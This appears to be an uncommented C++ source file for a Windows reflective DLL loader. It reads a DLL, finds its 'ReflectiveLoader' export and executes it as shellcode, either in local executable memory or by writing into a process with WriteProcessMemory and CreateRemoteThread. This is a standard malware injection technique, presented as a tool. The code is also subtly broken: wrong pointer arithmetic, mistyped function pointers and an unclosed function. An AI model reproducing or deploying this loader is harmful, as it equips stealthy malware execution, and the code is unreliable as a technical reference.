#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <Windows.h>

typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);
typedef FARPROC(WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
typedef BOOL(WINAPI* VirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef DWORD(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef DWORD(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

typedef DWORD(WINAPI* ReflectiveLoader_t)(LoadLibraryA_t, GetProcAddress_t, VirtualFree_t);

std::vector<char> ReadFileBytes(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        std::cerr << "Error: Could not open the file." << std::endl;
        exit(1);
    }
    std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});
    return buffer;
}

FARPROC GetReflectiveLoader(PIMAGE_DOS_HEADER dos_header) {
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((LPBYTE)dos_header + dos_header->e_lfanew);
    DWORD exports_directory_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exports_directory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)dos_header + exports_directory_rva);

    PDWORD names = (PDWORD)((LPBYTE)dos_header + exports_directory->AddressOfNames);
    for (DWORD i = 0; i < exports_directory->NumberOfNames; ++i) {
        LPCSTR function_name = (LPCSTR)((LPBYTE)dos_header + names[i]);
        if (strcmp(function_name, "ReflectiveLoader") == 0) {
            PDWORD functions = (PDWORD)((LPBYTE)dos_header + exports_directory->AddressOfFunctions);
            PWORD ordinals = (PWORD)((LPBYTE)dos_header + exports_directory->AddressOfNameOrdinals);
            DWORD function_rva = functions[ordinals[i]];
            return (FARPROC)((LPBYTE)dos_header + function_rva);
        }
    }
    return nullptr;
}

void LoadAndExecuteShellcode(const std::string& dll_path, bool local) {
    std::vector<char> dll_data = ReadFileBytes(dll_path);
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_data.data();

    ReflectiveLoader_t ReflectiveLoader = (ReflectiveLoader_t)GetReflectiveLoader(dos_header);
    if (!ReflectiveLoader) {
        std::cerr << "Error: Could not find ReflectiveLoader function." << std::endl;
        exit(1);
    }

    SIZE_T shellcode_size = dll_data.size();
    if (local) {
        LPVOID shellcode_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        RtlMoveMemory(shellcode_mem, dll_data.data(), shellcode_size);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReflectiveLoader, shellcode_mem, 0, NULL);
    } else {
    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (!target_process) {
    std::cerr << "Error: Could not open target process." << std::endl;
    exit(1);
    }

        LPVOID shellcode_mem = VirtualAllocEx(target_process, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode_mem) {
        std::cerr << "Error: Could not allocate memory in target process." << std::endl;
        CloseHandle(target_process);
        exit(1);
    }

    if (!WriteProcessMemory(target_process, shellcode_mem, dll_data.data(), shellcode_size, NULL)) {
        std::cerr << "Error: Could not write shellcode into target process memory." << std::endl;
        CloseHandle(target_process);
        exit(1);
    }

    CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE)ReflectiveLoader, shellcode_mem, 0, NULL);
    CloseHandle(target_process);
}

